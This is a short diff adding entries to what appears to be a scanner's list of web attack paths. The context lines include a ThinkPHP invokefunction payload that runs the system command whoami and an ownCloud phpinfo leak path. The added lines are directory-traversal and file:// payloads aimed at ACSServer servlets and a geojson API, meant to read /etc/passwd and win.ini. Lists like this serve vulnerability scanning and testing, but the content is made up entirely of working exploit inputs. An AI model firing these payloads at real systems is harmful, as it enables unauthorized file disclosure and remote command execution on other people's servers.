@@ -44,3 +44,10 @@
 /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/{{rand_base(4)}}.css
 /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/{{rand_base(4)}}.css
 /public//?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
+/ReportServer/Pages/ReportViewer.aspx
+/ACSServer/DownloadFileServlet?show_file_name=../../../../../../etc/passwd&type=uploadfile&path=anything
+/ACSServer/DownloadFileServlet?show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything
+/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../etc/passwd
+/ACSServer/WebServlet?act=getMapImg_acs2&filename=../../../../../../../windows/win.ini
+/api/geojson?url=file:///etc/passwd
+/api/geojson?url=file:///c://windows/win.ini
